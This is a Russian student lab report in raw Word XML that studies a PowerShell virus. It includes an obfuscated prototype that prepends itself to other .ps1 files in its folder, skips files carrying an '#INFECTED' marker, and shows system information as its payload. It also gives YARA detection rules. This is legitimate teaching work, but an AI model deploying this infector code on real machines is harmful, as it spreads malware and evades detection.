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6C82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4D8E14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1F4800BF" w14:textId="636A1503" w:rsidR="00C53ADA" w:rsidRPr="006A0481" w:rsidRDefault="00202F1D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-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28515496" w14:textId="3FEB9CA0" w:rsidR="00C53ADA" w:rsidRPr="00F92FA9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5326D6FB" w14:textId="424CC3C1" w:rsidR="00C53ADA" w:rsidRPr="00E14A23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141248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82B69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DA3399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E5FA7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C5F3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16B5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47FE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05618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7B0D9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4AC6729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A26DEED" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00830F2D" w:rsidRDefault="00830F2D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0042FC4C" w14:textId="1784479E" w:rsidR="00830F2D" w:rsidRPr="00735118" w:rsidRDefault="00830F2D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 w:rsidRPr="00830F2D">
        <w:rPr>
          <w:b/>
          <w:caps/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">по лабораторной </w:t>
      </w:r>
      <w:r w:rsidRPr="00335FD9">
        <w:rPr>
          <w:b/>
          <w:caps/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">работе № </w:t>
      </w:r>
      <w:r w:rsidR="00735118">
        <w:rPr>
          <w:b/>
          <w:caps/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D5AD0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45CA377" w14:textId="78CE97CE" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA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 w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>«</w:t>
      </w:r>
      <w:r w:rsidR="00D86D38">
        <w:t>Исследование работы вирусов</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F7E8FD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1B22D2B" w14:textId="4707705C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B18E7" w:rsidRPr="004B18E7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Программно-аппаратные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средства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обеспечения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информационной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603901DC" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="001E74F8">
      <w:pPr>
        <w:ind w:firstLine="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="060930CA" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="29A15D06" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="2E7A6607" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="28A8F2E3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7AA7DB" w14:textId="48BC298D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студент гр</w:t>
      </w:r>
      <w:r w:rsidR="00335FD9">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>. 5131001/20502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35FD9">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Черникова В.М</w:t>
      </w:r>
      <w:r w:rsidR="00735118" w:rsidRPr="00D86D38">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="208682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3364D88" w14:textId="446B2263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4B18E7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>еподаватель</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35494D33" w14:textId="437F515D" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="004B18E7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Pr="004B18E7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Семенов П</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="004B18E7">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> О</w:t>
      </w:r>
      <w:r w:rsidR="00D53D81">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58235B7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F79D2EE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9DCC5A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750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569F2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2545D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F4D6F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0E7B2B9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3C039C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744CB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86603EA" w14:textId="6E348735" w:rsidR="00160CFD" w:rsidRPr="00DB41D3" w:rsidRDefault="00DB41D3" w:rsidP="00DB41D3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DB41D3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>2025</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292A73AC" w14:textId="77777777" w:rsidR="00160CFD" w:rsidRP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sz w:val="24"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CA457D0" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00830F2D">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:keepNext/>
        <w:pageBreakBefore/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc214654477"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Формулировка задания</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="5580C9BC" w14:textId="05580689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Цель работы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C810FB" w14:textId="30CFFE75" w:rsidR="00DB41D3" w:rsidRDefault="000C12AA" w:rsidP="00DB41D3">
      <w:r>
        <w:t xml:space="preserve">Провести исследование </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ps1</w:t>
      </w:r>
      <w:r>
        <w:t>-вируса.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E40454D" w14:textId="0B98F954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Задачи</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6C75D4" w14:textId="77777777" w:rsidR="000035A6" w:rsidRDefault="000035A6" w:rsidP="000035A6">
      <w:r>
        <w:t>1. Представить простейшую блок-схему алгоритма вируса, заражающего все исполняемые файлы того же типа (расширения), расположенные в той же папке, откуда запускается исходный вирус. Необходимо предусмотреть возможность размещения полезной нагрузки и защиту от повторного заражения.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A67E11" w14:textId="77777777" w:rsidR="000035A6" w:rsidRDefault="000035A6" w:rsidP="000035A6">
      <w:r>
        <w:t>2. Реализовать прототип вируса, убедиться в возможности заражения других файлов.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504C673A" w14:textId="77777777" w:rsidR="000035A6" w:rsidRDefault="000035A6" w:rsidP="000035A6">
      <w:r>
        <w:t>3. Предложить сигнатуру для обнаружения антивирусом.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D03E3F" w14:textId="7A48A770" w:rsidR="009D3CCE" w:rsidRDefault="000035A6" w:rsidP="000035A6">
      <w:r>
        <w:t>4. Предложить варианты защиты (при отсутствии антивируса).</w:t>
      </w:r>
      <w:r w:rsidR="009D3CCE">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B52B39" w14:textId="1D1DA402" w:rsidR="00C53ADA" w:rsidRDefault="00A745CB" w:rsidP="00830F2D">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:keepNext/>
        <w:ind w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc214654478"/>
      <w:r>
        <w:t>Основная часть</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="1529B519" w14:textId="7D8F3681" w:rsidR="00E52A87" w:rsidRPr="002A5044" w:rsidRDefault="00E52A87" w:rsidP="00E52A87">
      <w:r>
        <w:t xml:space="preserve">Мой вариант включает исследование </w:t>
      </w:r>
      <w:r w:rsidR="00941061">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:r w:rsidR="00941061" w:rsidRPr="00941061">
        <w:t xml:space="preserve">1 </w:t>
      </w:r>
      <w:r w:rsidR="00941061">
        <w:t>вируса</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="005A3B73">
        <w:t xml:space="preserve"> Разработанная программа просматривает файлы того же расширения в той же директории, проверяет наличие уникальной метки («индикатор заражения») и, если метки нет, вставляет в файл собственный пролог с последующим исполнением исходного содержимого жертвы.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76439120" w14:textId="26076271" w:rsidR="00160CFD" w:rsidRDefault="00941061" w:rsidP="00160CFD">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>Блок-схема алгоритма вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F3978D" w14:textId="77777777" w:rsidR="007932A8" w:rsidRDefault="007932A8" w:rsidP="007932A8">
      <w:pPr>
        <w:pStyle w:val="af5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48473075" wp14:editId="6E1AD14B">
            <wp:extent cx="2999989" cy="5368867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107" cy="537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A52A" w14:textId="4A8E83BD" w:rsidR="00195AFF" w:rsidRPr="007932A8" w:rsidRDefault="007932A8" w:rsidP="007932A8">
      <w:pPr>
        <w:pStyle w:val="aa"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:instrText xml:space="preserve"> SEQ Рисунок \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F72384">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Блок-схема вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6082FC" w14:textId="1E85A354" w:rsidR="009C0BE6" w:rsidRDefault="009C0BE6" w:rsidP="009C0BE6">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc214654503"/>
      <w:r>
        <w:t>Реализация прототипа вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C3C4F0" w14:textId="4235B960" w:rsidR="0094040A" w:rsidRDefault="009C0BE6" w:rsidP="005865C7">
      <w:r>
        <w:t xml:space="preserve">Сначала была реализована основная логика работы вируса, ее можно увидеть в приложении </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="009C0BE6">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Но так как зараженные файлы увеличивались в объеме с 1кб до 9кб, было принято решение уменьшить код и обфусцировать его для более сложного обнаружения. Как полезная нагрузка вируса выводится </w:t>
      </w:r>
      <w:r w:rsidR="007E223D">
        <w:t xml:space="preserve">запланированная задача </w:t>
      </w:r>
      <w:r w:rsidR="00A9283B">
        <w:t>– окно с</w:t>
      </w:r>
      <w:r w:rsidR="007E223D">
        <w:t xml:space="preserve"> информацией о компьютере.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECED30B" w14:textId="358F97A1" w:rsidR="009C0BE6" w:rsidRDefault="009C0BE6" w:rsidP="009C0BE6">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6AD81A98" wp14:editId="3F1260BE">
                <wp:extent cx="5992034" cy="1987062"/>
                <wp:effectExtent l="0" t="0" r="27940" b="1333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2034" cy="19870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97D57" w14:textId="77777777" w:rsidR="00CC5C41" w:rsidRPr="00CC5C41" w:rsidRDefault="00CC5C41" w:rsidP="00971E07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after="240" w:line="276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$X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"#INFECTED"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$Y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$PSCommandPath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$Z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Split-Path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$Y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-Parent</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6E9A22A2" w14:textId="77777777" w:rsidR="00CC5C41" w:rsidRPr="00CC5C41" w:rsidRDefault="00CC5C41" w:rsidP="00971E07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after="240" w:line="276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function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$B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try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return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gc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$B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-ra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-match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$X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catch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return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$f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</w:p>
                          <w:p w14:paraId="2A2F8B40" w14:textId="77777777" w:rsidR="00CC5C41" w:rsidRPr="00CC5C41" w:rsidRDefault="00CC5C41" w:rsidP="00971E07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after="240" w:line="276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function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$D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$D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-eq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$Y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-or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$D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)){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return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$f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try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$E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gc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$D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-ra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$F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gc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$Y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-ra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$G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$F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-split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"`n#=="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$H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$X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"`n"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$G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00080"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]+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"`n#===`n"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'try{iex @"'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"`n"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$E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"`n"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'"@}catch{}'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sc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$D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$H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-fo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return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$t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catch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return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$f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</w:p>
                          <w:p w14:paraId="613BA60F" w14:textId="29089940" w:rsidR="009C0BE6" w:rsidRPr="0094040A" w:rsidRDefault="00CC5C41" w:rsidP="00971E07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after="240" w:line="276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gci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$Z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*.ps1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|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?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$_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FullName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-ne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$Y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|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%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$_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FullName};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$I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 xml:space="preserve">"PC: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$env:COMPUTERNAME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 xml:space="preserve">`nUser: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$env:USERNAME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 xml:space="preserve">`nOS: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$((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gwmi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Win32_OperatingSystem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Caption)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Add-Type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-AssemblyName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System.Windows.Forms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006161"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                                <w:lang w:val="en-US"/>
                              </w:rPr>
                              <w:t>System.Windows.Forms.MessageBox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]::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Show(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$I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"Info"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"OK"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69696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"Info"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CC5C41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AD81A9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71.8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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="0D897D57" w14:textId="77777777" w:rsidR="00CC5C41" w:rsidRPr="00CC5C41" w:rsidRDefault="00CC5C41" w:rsidP="00971E07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after="240" w:line="276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$X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"#INFECTED</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart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gramEnd"/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Y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PSCommandPath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$Z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Split-Path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$Y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-Parent</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6E9A22A2" w14:textId="77777777" w:rsidR="00CC5C41" w:rsidRPr="00CC5C41" w:rsidRDefault="00CC5C41" w:rsidP="00971E07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after="240" w:line="276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function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A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gramStart"/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B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){</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/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try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return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gc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$B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-ra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-match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$X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catch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return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$f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</w:p>
                    <w:p w14:paraId="2A2F8B40" w14:textId="77777777" w:rsidR="00CC5C41" w:rsidRPr="00CC5C41" w:rsidRDefault="00CC5C41" w:rsidP="00971E07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after="240" w:line="276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function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C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$D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){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$D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-eq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$Y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-or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A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$D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)){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return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$f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try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$E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gc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$D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-ra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$F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gc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$Y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-ra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$G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$F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-split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"`n#=="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$H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X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"`n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$G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[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CC5C41">
                        <w:rPr>
                          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
                          <w:color w:val="800080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                          <w:lang w:val="en-US"/>
                        </w:rPr>
                        <w:t>0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]+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"`n#===`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n"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'try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{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iex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 xml:space="preserve"> @"'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"`n"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$E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"`n"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'"@}catch{}'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sc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$D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$H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fo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return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$t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catch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CC5C41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return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$f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</w:p>
                    <w:p w14:paraId="613BA60F" w14:textId="29089940" w:rsidR="009C0BE6" w:rsidRPr="0094040A" w:rsidRDefault="00CC5C41" w:rsidP="00971E07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after="240" w:line="276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gci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$Z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*.ps1</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/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|</w:t>
                      </w:r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?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proofErr w:type="gramEnd"/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$_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.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FullName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-ne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$Y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|</w:t>
                      </w:r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%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C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$_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.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FullName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};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$I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 xml:space="preserve">"PC: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env:COMPUTERNAME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`nUser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env:USERNAME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`nOS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$((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gwmi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Win32_OperatingSystem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Caption)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Add-Type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</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CC5C41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AssemblyName</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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C5C41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System.Windows.Forms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[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CC5C41">
                        <w:rPr>
                          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
                          <w:color w:val="006161"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                          <w:lang w:val="en-US"/>
                        </w:rPr>
                        <w:t>System.Windows.Forms.MessageBox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]::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Show(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CC5C41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$I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"Info"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"OK"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CC5C41">
                        <w:rPr>
                          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
                          <w:color w:val="69696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CC5C41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"Info"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CC5C41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024AAF" w14:textId="38187970" w:rsidR="007E223D" w:rsidRDefault="007E223D" w:rsidP="003A1CBB">
      <w:r>
        <w:t xml:space="preserve">Работа вируса представлена на рисунках </w:t>
      </w:r>
      <w:r w:rsidR="00EF2109">
        <w:t>2, 3</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00EF2109">
        <w:t xml:space="preserve"> Результат заражения на рисунках 4 и 5.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBF24DF" w14:textId="77777777" w:rsidR="003A1CBB" w:rsidRDefault="00933E0A" w:rsidP="003A1CBB">
      <w:pPr>
        <w:pStyle w:val="af5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="018F2FEA" wp14:editId="1999F8DC">
            <wp:extent cx="3255818" cy="2215299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6935" cy="221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A9F6" w14:textId="69DE02D3" w:rsidR="00933E0A" w:rsidRDefault="003A1CBB" w:rsidP="003A1CBB">
      <w:pPr>
        <w:pStyle w:val="aa"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:instrText xml:space="preserve"> SEQ Рисунок \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F72384">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidR="007E65B7">
        <w:t>К</w:t>
      </w:r>
      <w:r>
        <w:t>омандная строка</w:t>
      </w:r>
      <w:r w:rsidR="007E65B7">
        <w:t xml:space="preserve"> вывода</w:t>
      </w:r>
      <w:r w:rsidR="001F5F19">
        <w:t xml:space="preserve"> в</w:t>
      </w:r>
      <w:r w:rsidR="007E65B7">
        <w:t>ируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71119EC3" w14:textId="77777777" w:rsidR="003A1CBB" w:rsidRDefault="003A1CBB" w:rsidP="009C0BE6"/>
    <w:p w14:paraId="75C77913" w14:textId="77777777" w:rsidR="003A1CBB" w:rsidRDefault="00933E0A" w:rsidP="003A1CBB">
      <w:pPr>
        <w:pStyle w:val="af5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="576D353F" wp14:editId="347B5E65">
            <wp:extent cx="3110345" cy="20227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03" t="3827" r="3982" b="3020"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3110678" cy="202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2A8C5" w14:textId="317EA72F" w:rsidR="007E223D" w:rsidRPr="009C0BE6" w:rsidRDefault="003A1CBB" w:rsidP="003A1CBB">
      <w:pPr>
        <w:pStyle w:val="aa"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:instrText xml:space="preserve"> SEQ Рисунок \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F72384">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00B5436E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidR="007E65B7">
        <w:t>П</w:t>
      </w:r>
      <w:r>
        <w:t>олезная нагрузка вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C61771D" w14:textId="0691C47C" w:rsidR="007E223D" w:rsidRDefault="003A1CBB" w:rsidP="007E223D">
      <w:pPr>
        <w:pStyle w:val="af5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="212B8837" wp14:editId="1F376840">
            <wp:extent cx="4225553" cy="930397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5855" cy="95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2FA" w14:textId="706FE0F1" w:rsidR="009C0BE6" w:rsidRDefault="007E223D" w:rsidP="007E223D">
      <w:pPr>
        <w:pStyle w:val="aa"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Рисунок </w:t>
      </w:r>
      <w:r w:rsidR="005D27F7">
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidR="003A1CBB">
        <w:t>Незараженный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> файл</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE2E850" w14:textId="77777777" w:rsidR="005D27F7" w:rsidRDefault="005D27F7" w:rsidP="005D27F7">
      <w:pPr>
        <w:pStyle w:val="af5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0AACBF7B" wp14:editId="29BB88B3">
            <wp:extent cx="4215361" cy="143726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3768" cy="14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2262" w14:textId="33A2511A" w:rsidR="005D27F7" w:rsidRPr="005D27F7" w:rsidRDefault="005D27F7" w:rsidP="005D27F7">
      <w:pPr>
        <w:pStyle w:val="aa"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Рисунок 5 - </w:t>
      </w:r>
      <w:r w:rsidR="005D1199">
        <w:t>З</w:t>
      </w:r>
      <w:r>
        <w:t>араженный файл</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B61C595" w14:textId="77777777" w:rsidR="009C0BE6" w:rsidRPr="009C0BE6" w:rsidRDefault="009C0BE6" w:rsidP="009C0BE6">
      <w:pPr>
        <w:ind w:firstLine="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01C3B734" w14:textId="638CA579" w:rsidR="009C0BE6" w:rsidRDefault="00984831" w:rsidP="00160CFD">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>Сигнатура для обнаружения вируса</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B50DFE" w14:textId="25C75307" w:rsidR="00984831" w:rsidRDefault="005865C7" w:rsidP="00984831">
      <w:r>
        <w:t xml:space="preserve">Для обнаружения вируса были предложены следующие </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>YARA</w:t>
      </w:r>
      <w:r w:rsidRPr="005865C7">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>правила для обнаружения сигнатур:</w:t>
      </w:r>
      <w:r w:rsidR="00C1681C">
        <w:t xml:space="preserve"> прочтение своего имени файла и последовательные команды для самокопирования</w:t>
      </w:r>
      <w:r w:rsidRPr="00315E69">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193EB3E8" w14:textId="47467F5A" w:rsidR="005865C7" w:rsidRDefault="005438C9" w:rsidP="00984831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347D21D" wp14:editId="189D7EFE">
                <wp:extent cx="5638800" cy="2790092"/>
                <wp:effectExtent l="0" t="0" r="19050" b="10795"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2790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0B759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rule PS1_Virus_Self {</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="57F90A27" w14:textId="34F87BF1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strings:</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1B17CEF2" w14:textId="3BB7A138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    $self_path = "$PSCommandPath" nocase ascii</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7B6ADD0C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condition:</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4DAF0BF8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    all of them</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4F6B179D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5A75B8CD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13F7759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rule PS1_Virus_ReadWrite {</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="67A80EA9" w14:textId="0EB0C4ED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strings:</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="35475272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ab/>
                              <w:t>$self_read  = /gc\s+\$?[A-Za-z0-9_]{1,20}\s+-ra/i ascii</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0F059ACB" w14:textId="751127AD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    $self_write = /sc\s+\$?[A-Za-z0-9_]{1,20}\s+\$?[A-Za-z0-9_]{1,20}\s+-fo/i ascii</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="651004EF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condition:</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="329A1E97" w14:textId="77777777" w:rsidR="00C1681C" w:rsidRPr="00C1681C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 xml:space="preserve">        all of them</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="259F3C83" w14:textId="5D94518F" w:rsidR="005438C9" w:rsidRPr="0094040A" w:rsidRDefault="00C1681C" w:rsidP="00C1681C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681C">
                              <w:rPr>
                                <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console" w:cs="Lucida Console"/>
                                <w:color w:val="A82D00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47D21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44pt;height:2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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="1780B759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rule PS1_Virus_Self {</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="57F90A27" w14:textId="34F87BF1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strings:</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1B17CEF2" w14:textId="3BB7A138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    $self_path = "$PSCommandPath" nocase ascii</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7B6ADD0C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condition:</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4DAF0BF8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    all of them</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4F6B179D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5A75B8CD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</w:p>
                    <w:p w14:paraId="713F7759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rule PS1_Virus_ReadWrite {</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="67A80EA9" w14:textId="0EB0C4ED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strings:</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="35475272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ab/>
                        <w:t>$self_read  = /gc\s+\$?[A-Za-z0-9_]{1,20}\s+-ra/i ascii</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0F059ACB" w14:textId="751127AD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    $self_write = /sc\s+\$?[A-Za-z0-9_]{1,20}\s+\$?[A-Za-z0-9_]{1,20}\s+-fo/i ascii</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="651004EF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condition:</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="329A1E97" w14:textId="77777777" w:rsidR="00C1681C" w:rsidRPr="00C1681C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 xml:space="preserve">        all of them</w:t>
                      </w:r>
                    </w:p>
